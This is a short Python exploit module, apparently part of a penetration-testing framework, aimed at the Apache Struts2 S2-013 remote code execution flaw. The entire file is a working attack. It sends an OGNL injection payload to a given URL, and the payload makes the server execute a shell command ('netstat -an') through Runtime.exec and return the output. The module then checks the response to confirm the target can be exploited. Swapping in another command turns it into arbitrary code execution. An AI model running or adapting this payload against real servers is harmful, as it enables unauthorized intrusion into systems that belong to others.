#! /usr/bin/env python
#coding:utf-8
import requests

author = ""
scope = ""
description = "Struts2 远程代码执行漏洞"
reference = ""
options = [
    {
        "Name": "URL",
        "Current Setting": "",
        "Required": True,
        "Description": "网站地址"
    }
]

def struts2_013(URL):
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    exp = '''a=1${(%23_memberAccess["allowStaticMethodAccess"]=true,%23a=@java.lang.Runtime@getRuntime().exec('netstat -an').getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[50000],%23c.read(%23d),%23sbtest=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23sbtest.println(%23d),%23sbtest.close())}'''

    try:
        resp = requests.post(URL, data=exp, headers=headers, timeout=10)
        if "0.0.0.0" in resp.content:
            return "s2-013 存在利用"
    except:
        return None
    return None